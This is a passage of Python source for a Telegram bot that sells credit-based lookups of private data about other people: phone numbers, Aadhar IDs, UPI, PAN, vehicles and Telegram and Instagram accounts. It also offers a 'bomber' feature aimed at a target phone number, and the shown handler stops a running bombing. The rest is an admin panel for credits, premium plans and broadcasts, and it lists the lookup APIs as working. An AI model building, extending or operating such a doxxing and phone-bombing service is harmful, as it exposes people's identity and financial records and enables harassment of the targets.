        return format_message(
            f"📋 <b>{title}</b>\n{_DIV()}\n"
            f"🕐 {now}\n"
            f"🔎 {query_label}: <code>{query_value}</code>\n"
            f"❌ ɴᴏ ʀᴇᴄᴏʀᴅꜱ ꜰᴏᴜɴᴅ\n{_DIV()}"
        )
    
    cache_badge = " 💾 [CACHE]" if data.get('_from_cache') else ""
    cache_time = f"\n📅 ᴄᴀᴄʜᴇᴅ: {data.get('_cache_time', 'N/A')}" if data.get('_from_cache') else ""
    
    lines = [
        f"📋 <b>{title}</b>{cache_badge}",
        f"{_DIV()}",
        f"🕐 {now}",
        f"🔎 {query_label}: <code>{_esc(str(query_value))}</code>",
        f"📊 ᴛᴏᴛᴀʟ ʀᴇᴄᴏʀᴅꜱ: <b>{len(records)}</b>{cache_time}",
        f"📡 <b>ꜱᴏᴜʀᴄᴇ:</b> {data.get('source', 'Unknown')}",
        f"{_DIV()}",
    ]
    
    for idx, item in enumerate(records, 1):
        if len(records) > 1:
            lines.append(f"")
            lines.append(f"👤 <b>ʀᴇᴄᴏʀᴅ {idx}/{len(records)}</b>")
        
        fields = []
        for k, v in item.items():
            if k.lower() in ('success', 'status', 'msg', 'message', '_raw', 'metadata', 'source', '_from_cache', '_cache_time'):
                continue
            if v and str(v).strip() not in ('', 'N/A', 'None', 'null', '0'):
                emoji = '👤' if 'name' in k.lower() else '🏠' if 'address' in k.lower() else '📱' if 'number' in k.lower() else '•'
                fields.append((emoji, k.replace('_', ' ').title(), v))
        
        if fields:
            for i, (em, label, val) in enumerate(fields[:10]):
                c = "└" if i == len(fields[:10]) - 1 else "├"
                lines.append(f"{c}{em} <b>{label}</b>: <code>{_esc(str(val))}</code>")
        else:
            lines.append("└❌ ɴᴏ ᴅᴀᴛᴀ")
    
    lines.append(f"{_DIV()}")
    return format_message("\n".join(lines))

def format_number_info_bold(data, number):
    return format_generic_result(data, "📱 𝗡𝗨𝗠𝗕𝗘𝗥 𝗜𝗡𝗙𝗢", "📞 Number", number)

def format_aadhar_result_bold(data, aadhar):
    return format_generic_result(data, "🪪 𝗔𝗔𝗗𝗛𝗔𝗥 𝗜𝗡𝗙𝗢", "🪪 Aadhar", aadhar)

def format_upi_result_bold(data, upi):
    return format_generic_result(data, "💳 𝗨𝗣𝗜 𝗜𝗡𝗙𝗢", "💳 UPI", upi)

def format_tg_user_result(data, identifier):
    return format_generic_result(data, "👤 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢", "🔍 Query", identifier)

# ==================== KEYBOARDS ====================

def main_keyboard(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    markup.row(
        KeyboardButton("📱 ɴᴜᴍʙᴇʀ ɪɴꜰᴏ"),
        KeyboardButton("👤 ꜱᴇʟᴇᴄᴛ ᴜꜱᴇʀ")
    )
    markup.row(
        KeyboardButton("🔍 ᴜꜱᴇʀɴᴀᴍᴇ ɪɴꜰᴏ"),
        KeyboardButton("🆔 ᴛɢ ɪᴅ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("🆔 ᴀᴀᴅʜᴀʀ ɪɴꜰᴏ"),
        KeyboardButton("📷 ɪɴꜱᴛᴀɢʀᴀᴍ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("🏦 ɪꜰꜱᴄ ɪɴꜰᴏ"),
        KeyboardButton("🚗 ᴠᴇʜɪᴄʟᴇ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("💼 ɢꜱᴛ ɪɴꜰᴏ"),
        KeyboardButton("🪪 ᴩᴀɴ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("🇵🇰 ᴩᴀᴋ ɴᴜᴍ ɪɴꜰᴏ"),
        KeyboardButton("🎮 ꜰʀᴇᴇ ꜰɪʀᴇ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("📍 ᴩɪɴᴄᴏᴅᴇ ɪɴꜰᴏ"),
        KeyboardButton("💳 ᴜᴩɪ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("💎 ʜɪᴛᴇᴋ-ɴᴜᴍ-ɪɴꜰᴏ 👑"),
        KeyboardButton("🌟 ʜɪᴛᴇᴋ-ꜰᴜʟʟ-ɪɴꜰᴏ 👑")
    )
    markup.row(
        KeyboardButton("💣 ʙᴏᴍʙᴇʀ"),
        KeyboardButton("🎁 ᴅᴀɪʟʏ ᴄʟᴀɪᴍ")
    )
    markup.row(
        KeyboardButton("💎 ᴩʀᴇᴍɪᴜᴍ"),
        KeyboardButton("💰 ʙᴀʟᴀɴᴄᴇ")
    )
    markup.row(
        KeyboardButton("💳 ᴩᴜʀᴄʜᴀꜱᴇ ᴩʀᴇᴍɪᴜᴍ"),
        KeyboardButton("👥 ʀᴇꜰᴇʀʀᴀʟꜱ")
    )
    markup.row(
        KeyboardButton("🤖 ᴄʟᴏɴᴇ ʙᴏᴛ"),
        KeyboardButton("🎫 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ")
    )
    markup.row(
        KeyboardButton("📢 ᴄʜᴀɴɴᴇʟ"),
        KeyboardButton("📋 ᴍʏ ʜɪꜱᴛᴏʀʏ")
    )
    markup.row(
        KeyboardButton("ℹ️ ʜᴇʟᴩ"),
        KeyboardButton("🔑 ᴍʏ ᴀᴩɪ ᴋᴇʏꜱ")
    )
    
    if is_admin(user_id):
        markup.row(KeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴩᴀɴᴇʟ"))
    
    return markup

def admin_keyboard(uid=0):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    markup.row(
        KeyboardButton("📊 ᴅᴀꜱʜʙᴏᴀʀᴅ"),
        KeyboardButton("👥 ᴜꜱᴇʀ ʟɪꜱᴛ")
    )
    markup.row(
        KeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀꜱᴛ"),
        KeyboardButton("🚫 ʙʟᴏᴄᴋ ᴜꜱᴇʀ")
    )
    markup.row(
        KeyboardButton("✅ ᴜɴʙʟᴏᴄᴋ ᴜꜱᴇʀ"),
        KeyboardButton("👤 ᴜꜱᴇʀ ɪɴꜰᴏ")
    )
    markup.row(
        KeyboardButton("💎 ᴀᴅᴅ ᴩʀᴇᴍɪᴜᴍ"),
        KeyboardButton("🚫 ʀᴇᴍᴏᴠᴇ ᴩʀᴇᴍɪᴜᴍ")
    )
    markup.row(
        KeyboardButton("💰 ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ"),
        KeyboardButton("💸 ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛꜱ")
    )
    markup.row(
        KeyboardButton("⚙️ ꜱᴇᴛ ᴄʀᴇᴅɪᴛꜱ"),
        KeyboardButton("₹ ᴀᴅᴅ ᴍᴏɴᴇʏ")
    )
    markup.row(
        KeyboardButton("🗑️ ᴅᴇʟᴇᴛᴇ ʜɪꜱᴛᴏʀʏ"),
        KeyboardButton("📤 ᴇxᴩᴏʀᴛ ᴜꜱᴇʀꜱ")
    )
    markup.row(
        KeyboardButton("🔔 ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ"),
        KeyboardButton("📊 ᴄᴀᴄʜᴇ ꜱᴛᴀᴛꜱ")
    )
    markup.row(
        KeyboardButton("🔧 ᴀᴩɪ ᴄᴏɴꜰɪɢ"),
        KeyboardButton("🤖 ᴄʟᴏɴᴇ ʙᴏᴛꜱ")
    )
    markup.row(
        KeyboardButton("🔧 ꜰᴇᴀᴛᴜʀᴇ ᴄᴏꜱᴛꜱ"),
        KeyboardButton("💎 ᴩʀᴇᴍɪᴜᴍ ᴩʀɪᴄᴇꜱ")
    )
    markup.row(
        KeyboardButton("🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ"),
        KeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ")
    )
    
    return markup

# ==================== BOMBER CALLBACK ====================

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_bomb_"))
def stop_bomb_callback(call):
    uid = call.from_user.id
    bomber_id = call.data.replace("stop_bomb_", "")
    
    if bomber_id in active_bombers:
        if bomber_id in bomber_stop_flags:
            bomber_stop_flags[bomber_id] = True
        
        bot.answer_callback_query(call.id, "🛑 Bomber Stopped!", show_alert=True)
        
        if bomber_id in active_bombers and active_bombers[bomber_id].get('completed', False):
            result_text = format_brutal_result(bomber_id)
        else:
            result_text = f"<b>🛑 Bomber Stopped!</b>\n\nTarget: <code>{active_bombers[bomber_id]['phone']}</code>\n\n⏳ Finalizing stats..."
        
        try:
            bot.edit_message_text(
                format_message(result_text),
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
        except Exception:
            pass
    else:
        bot.answer_callback_query(call.id, "❌ Bomber not found!", show_alert=True)

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or "User"
    
    ref = None
    if len(message.text.split()) > 1:
        try:
            ref = int(message.text.split()[1])
            if ref == uid:
                ref = None
        except Exception:
            pass
    
    if not get_user(uid):
        add_user(uid, uname, fname, ref)
    
    text = f"""👋 <b>Welcome</b> <code>{_esc(fname)}</code>!

💰 <b>Credits:</b> <code>{get_credits(uid)}</code>
🔑 <b>API Key:</b> <code>MADX</code>

📌 <b>Use the buttons below to search!</b>"""
    
    bot.send_message(uid, format_message(text), reply_markup=main_keyboard(uid))

@bot.message_handler(func=lambda m: m.text == "🔙 ᴍᴀɪɴ ᴍᴇɴᴜ" and not is_group(m))
def menu_btn(m):
    uid = m.from_user.id
    user_state.pop(uid, None)
    text = f"👋 <b>Main Menu</b>\n💰 <b>Credits:</b> <code>{get_credits(uid)}</code>"
    bot.send_message(uid, format_message(text), reply_markup=main_keyboard(uid))

# ==================== ADMIN PANEL ====================

@bot.message_handler(func=lambda m: m.text == "⚙️ ᴀᴅᴍɪɴ ᴩᴀɴᴇʟ" and is_admin(m.from_user.id) and not is_group(m))
def admin_panel(m):
    uid = m.from_user.id
    admin_page[uid] = 1
    text = """
<b>⚙️ ᴀᴅᴍɪɴ ᴩᴀɴᴇʟ</b>
━━━━━━━━━━━━━━━━━━
📊 Dashboard — Bot stats
👥 User List — All users
📢 Broadcast — Send message
🚫 Block User — Block user
✅ Unblock User — Unblock user
👤 User Info — User details
💎 Add Premium — Add premium
🚫 Remove Premium — Remove premium
💰 Add Credits — Add credits
💸 Remove Credits — Remove credits
⚙️ Set Credits — Set credits
₹ Add Money — Add money
🗑️ Delete History — Delete history
📤 Export Users — Export users CSV
🔔 Notify User — Notify user
📊 Cache Stats — Cache statistics
🔧 API Config — API config
🤖 Clone Bots — Clone bots
🔧 Feature Costs — Feature costs
💎 Premium Prices — Premium prices
🛠️ Maintenance — Maintenance mode
"""
    bot.send_message(uid, format_message(text), reply_markup=admin_keyboard(uid))

# ==================== DASHBOARD ====================

@bot.message_handler(func=lambda m: m.text == "📊 ᴅᴀꜱʜʙᴏᴀʀᴅ" and is_admin(m.from_user.id) and not is_group(m))
def admin_dashboard(m):
    uid = m.from_user.id
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        today = c.execute("SELECT COUNT(*) FROM users WHERE DATE(join_date)=DATE('now')").fetchone()[0]
        premium = c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1 AND premium_until > datetime('now')").fetchone()[0]
        blocked = c.execute("SELECT COUNT(*) FROM users WHERE is_blocked=1").fetchone()[0]
        searches = c.execute("SELECT COUNT(*) FROM search_history").fetchone()[0]
        admins = c.execute("SELECT COUNT(*) FROM admins").fetchone()[0]
        conn.close()
        
        text = f"""
<b>📊 ᴅᴀꜱʜʙᴏᴀʀᴅ</b>
━━━━━━━━━━━━━━━━━━
👥 <b>Total Users:</b> <code>{total}</code>
📈 <b>Today Joined:</b> <code>{today}</code>
💎 <b>Premium:</b> <code>{premium}</code>
🚫 <b>Blocked:</b> <code>{blocked}</code>
🔍 <b>Total Searches:</b> <code>{searches}</code>
👑 <b>Admins:</b> <code>{admins}</code>
━━━━━━━━━━━━━━━━━━
🕐 <b>Time:</b> {datetime.now().strftime('%d %b %Y %I:%M %p')}
"""
        bot.reply_to(m, format_message(text), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== USER LIST ====================

@bot.message_handler(func=lambda m: m.text == "👥 ᴜꜱᴇʀ ʟɪꜱᴛ" and is_admin(m.from_user.id) and not is_group(m))
def admin_user_list(m):
    uid = m.from_user.id
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("SELECT user_id, first_name, credits, is_premium, is_blocked FROM users ORDER BY join_date DESC LIMIT 20")
        users = c.fetchall()
        total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        conn.close()
        
        text = f"<b>👥 Recent Users ({total} total)</b>\n━━━━━━━━━━━━━━━━━━\n"
        for u in users:
            status = "💎" if u[3] else "👤"
            status += "🚫" if u[4] else ""
            text += f"{status} <code>{u[0]}</code> — {u[1][:15] if u[1] else '?'} | 💰{u[2]}\n"
        bot.reply_to(m, format_message(text), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== BROADCAST ====================

@bot.message_handler(func=lambda m: m.text == "📢 ʙʀᴏᴀᴅᴄᴀꜱᴛ" and is_admin(m.from_user.id) and not is_group(m))
def admin_broadcast(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Jo message sabhi users ko bhejna hai woh type karo:\n"
        "<i>(Text, Photo, Video — sab chalega)</i>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE is_blocked=0")
        users = c.fetchall()
        conn.close()
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')
        return
    
    if not users:
        bot.reply_to(m, format_message("<b>❌ No users found!</b>"), parse_mode='HTML')
        return
    
    sent = 0
    failed = 0
    
    status_msg = bot.reply_to(m, format_message(f"<b>⏳ Sending to {len(users)} users...</b>"), parse_mode='HTML')
    
    for (user_id,) in users:
        try:
            if m.text:
                bot.send_message(user_id, format_message(f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━━━\n{m.text}"), parse_mode='HTML')
            elif m.photo:
                bot.send_photo(user_id, m.photo[-1].file_id, caption=f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━━━\n{m.caption if m.caption else ''}")
            elif m.video:
                bot.send_video(user_id, m.video.file_id, caption=f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━━━\n{m.caption if m.caption else ''}")
            elif m.document:
                bot.send_document(user_id, m.document.file_id, caption=f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━━━\n{m.caption if m.caption else ''}")
            sent += 1
        except Exception:
            failed += 1
        time.sleep(0.05)
    
    bot.edit_message_text(
        format_message(f"<b>✅ Broadcast Done!</b>\n━━━━━━━━━━━━━━━━━━\n✅ Sent: <code>{sent}</code>\n❌ Failed: <code>{failed}</code>"),
        m.chat.id, status_msg.message_id, parse_mode='HTML'
    )

# ==================== BLOCK/UNBLOCK ====================

@bot.message_handler(func=lambda m: m.text == "🚫 ʙʟᴏᴄᴋ ᴜꜱᴇʀ" and is_admin(m.from_user.id) and not is_group(m))
def admin_block_user(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>🚫 Block User</b>\n━━━━━━━━━━━━━━━━━━\n"
        "User ID bhejo:"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_block_user)

def process_block_user(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        target = int(m.text.strip())
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_blocked=1 WHERE user_id=?", (target,))
        conn.commit()
        conn.close()
        bot.reply_to(m, format_message(f"<b>✅ User <code>{target}</code> blocked!</b>"), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "✅ ᴜɴʙʟᴏᴄᴋ ᴜꜱᴇʀ" and is_admin(m.from_user.id) and not is_group(m))
def admin_unblock_user(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>✅ Unblock User</b>\n━━━━━━━━━━━━━━━━━━\n"
        "User ID bhejo:"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_unblock_user)

def process_unblock_user(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        target = int(m.text.strip())
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_blocked=0 WHERE user_id=?", (target,))
        conn.commit()
        conn.close()
        bot.reply_to(m, format_message(f"<b>✅ User <code>{target}</code> unblocked!</b>"), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== USER INFO ====================

@bot.message_handler(func=lambda m: m.text == "👤 ᴜꜱᴇʀ ɪɴꜰᴏ" and is_admin(m.from_user.id) and not is_group(m))
def admin_user_info(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>👤 User Info</b>\n━━━━━━━━━━━━━━━━━━\n"
        "User ID bhejo:"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_user_info)

def process_user_info(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        target = int(m.text.strip())
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id=?", (target,))
        user = c.fetchone()
        conn.close()
        
        if not user:
            bot.reply_to(m, format_message(f"<b>❌ User <code>{target}</code> not found!</b>"), parse_mode='HTML')
            return
        
        text = f"""
<b>👤 User Info</b>
━━━━━━━━━━━━━━━━━━
🆔 ID: <code>{user[0]}</code>
👤 Username: @{user[1] if user[1] else 'N/A'}
📛 Name: {user[2] or 'N/A'}
📅 Joined: {user[3][:10] if user[3] else 'N/A'}
💰 Credits: <code>{user[5] or 0}</code>
💎 Premium: {'✅' if user[7] else '❌'}
🚫 Blocked: {'🚫' if user[6] else '✅'}
🔍 Searches: <code>{user[10] or 0}</code>
"""
        bot.reply_to(m, format_message(text), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== PREMIUM ====================

@bot.message_handler(func=lambda m: m.text == "💎 ᴀᴅᴅ ᴩʀᴇᴍɪᴜᴍ" and is_admin(m.from_user.id) and not is_group(m))
def admin_add_premium(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>💎 Add Premium</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID DAYS</code>\n"
        "Example: <code>123456 30</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_add_premium)

def process_add_premium(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split()
        target = int(parts[0])
        days = int(parts[1])
        
        user = get_user(target)
        now_dt = datetime.now()
        start_from = now_dt
        if user and user[7] == 1 and user[8]:
            try:
                existing = datetime.strptime(user[8], "%Y-%m-%d %H:%M:%S")
                if existing > now_dt:
                    start_from = existing
            except Exception:
                pass
        
        until = start_from + timedelta(days=days)
        until_str = until.strftime("%Y-%m-%d %H:%M:%S")
        
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_premium=1, premium_until=? WHERE user_id=?", (until_str, target))
        conn.commit()
        conn.close()
        
        bot.reply_to(m, format_message(
            f"<b>✅ Premium Added!</b>\n"
            f"👤 User: <code>{target}</code>\n"
            f"📅 Days: <code>{days}</code>\n"
            f"⏳ Until: <code>{until_str}</code>"
        ), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🚫 ʀᴇᴍᴏᴠᴇ ᴩʀᴇᴍɪᴜᴍ" and is_admin(m.from_user.id) and not is_group(m))
def admin_remove_premium(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>🚫 Remove Premium</b>\n━━━━━━━━━━━━━━━━━━\n"
        "User ID bhejo:"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_remove_premium)

def process_remove_premium(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        target = int(m.text.strip())
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_premium=0, premium_until=NULL WHERE user_id=?", (target,))
        conn.commit()
        conn.close()
        bot.reply_to(m, format_message(f"<b>✅ Premium removed from <code>{target}</code></b>"), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== CREDITS ====================

@bot.message_handler(func=lambda m: m.text == "💰 ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_add_credits(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>💰 Add Credits</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456 50</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_add_credits)

def process_add_credits(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split()
        target = int(parts[0])
        amount = int(parts[1])
        add_credits(target, amount)
        bot.reply_to(m, format_message(
            f"<b>✅ +{amount} credits added!</b>\n"
            f"👤 User: <code>{target}</code>\n"
            f"💰 New balance: <code>{get_credits(target)}</code>"
        ), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💸 ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_remove_credits(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>💸 Remove Credits</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456 20</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_remove_credits)

def process_remove_credits(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split()
        target = int(parts[0])
        amount = int(parts[1])
        if remove_credits(target, amount):
            bot.reply_to(m, format_message(
                f"<b>✅ -{amount} credits removed!</b>\n"
                f"👤 User: <code>{target}</code>\n"
                f"💰 New balance: <code>{get_credits(target)}</code>"
            ), parse_mode='HTML')
        else:
            bot.reply_to(m, format_message(f"<b>❌ Insufficient credits!</b>"), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "⚙️ ꜱᴇᴛ ᴄʀᴇᴅɪᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_set_credits(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>⚙️ Set Credits</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456 100</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_set_credits)

def process_set_credits(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split()
        target = int(parts[0])
        amount = int(parts[1])
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET credits=? WHERE user_id=?", (amount, target))
        conn.commit()
        conn.close()
        bot.reply_to(m, format_message(
            f"<b>✅ Credits set!</b>\n"
            f"👤 User: <code>{target}</code>\n"
            f"💰 New balance: <code>{amount}</code>"
        ), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== ADD MONEY ====================

@bot.message_handler(func=lambda m: m.text == "₹ ᴀᴅᴅ ᴍᴏɴᴇʏ" and is_admin(m.from_user.id) and not is_group(m))
def admin_add_money(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>₹ Add Money</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456 100</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_add_money)

def process_add_money(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split()
        target = int(parts[0])
        amount = int(parts[1])
        add_money(target, amount)
        bot.reply_to(m, format_message(
            f"<b>✅ +₹{amount} added!</b>\n"
            f"👤 User: <code>{target}</code>\n"
            f"💰 New money: <code>₹{get_money(target)}</code>"
        ), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== DELETE HISTORY ====================

@bot.message_handler(func=lambda m: m.text == "🗑️ ᴅᴇʟᴇᴛᴇ ʜɪꜱᴛᴏʀʏ" and is_admin(m.from_user.id) and not is_group(m))
def admin_delete_history(m):
    uid = m.from_user.id
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    c.execute("DELETE FROM search_history")
    deleted = c.rowcount
    conn.commit()
    conn.close()
    bot.reply_to(m, format_message(f"<b>✅ {deleted} history records deleted!</b>"), parse_mode='HTML')

# ==================== EXPORT USERS ====================

@bot.message_handler(func=lambda m: m.text == "📤 ᴇxᴩᴏʀᴛ ᴜꜱᴇʀꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_export_users(m):
    uid = m.from_user.id
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("SELECT user_id, username, first_name, join_date, credits, is_premium, is_blocked FROM users")
        users = c.fetchall()
        conn.close()
        
        import io
        lines = ["user_id,username,first_name,join_date,credits,is_premium,is_blocked"]
        for u in users:
            lines.append(f"{u[0]},{u[1] or ''},{u[2] or ''},{u[3]},{u[4]},{u[5]},{u[6]}")
        
        csv = io.BytesIO("\n".join(lines).encode())
        csv.name = f"users_export_{datetime.now().strftime('%Y%m%d')}.csv"
        bot.send_document(m.chat.id, csv, caption=f"<b>📤 Users Export</b>\n👥 Total: {len(users)}", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== NOTIFY USER ====================

@bot.message_handler(func=lambda m: m.text == "🔔 ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ" and is_admin(m.from_user.id) and not is_group(m))
def admin_notify(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, format_message(
        "<b>🔔 Notify User</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>USER_ID MESSAGE</code>\n"
        "Example: <code>123456 Hello! Your account is ready.</code>"
    ), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_notify)

def process_notify(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    try:
        parts = m.text.strip().split(" ", 1)
        target = int(parts[0])
        message = parts[1]
        bot.send_message(target, format_message(f"<b>📢 Notification</b>\n━━━━━━━━━━━━━━━━━━\n{message}"), parse_mode='HTML')
        bot.reply_to(m, format_message(f"<b>✅ Notification sent to <code>{target}</code></b>"), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== CACHE STATS ====================

@bot.message_handler(func=lambda m: m.text == "📊 ᴄᴀᴄʜᴇ ꜱᴛᴀᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_cache_stats(m):
    stats = cache_get_all_stats()
    text = "<b>📊 Cache Statistics</b>\n━━━━━━━━━━━━━━━━━━\n"
    total = 0
    hits = 0
    for table, data in stats.items():
        text += f"📌 <b>{table.upper()}</b>: {data['count']} items | {data['hits']} hits\n"
        total += data['count']
        hits += data['hits']
    text += f"\n━━━━━━━━━━━━━━━━━━\n📦 <b>Total Items:</b> {total}\n🎯 <b>Total Hits:</b> {hits}"
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== API CONFIG ====================

@bot.message_handler(func=lambda m: m.text == "🔧 ᴀᴩɪ ᴄᴏɴꜰɪɢ" and is_admin(m.from_user.id) and not is_group(m))
def admin_api_config(m):
    uid = m.from_user.id
    text = """
<b>🔧 API Config</b>
━━━━━━━━━━━━━━━━━━
📋 <b>Current API Status:</b>

🟢 Number API — Working
🟢 Aadhar API — Working
🟢 UPI API — Working
🟢 Instagram API — Working
🟢 IFSC API — Working
🟢 Vehicle API — Working
🟢 GST API — Working
🟢 PAN API — Working
🟢 Pak API — Working
🟢 Pincode API — Working
🟢 Free Fire API — Working
🟢 TG User API — Working (Username + ID)
🟢 Hitek Full — Working (Username + Number)
🔑 <b>Brutal Bomber Key:</b> <code>MADX</code>

💾 <b>Cache:</b> All results cached
📌 <b>Contact:</b> Unknown
"""
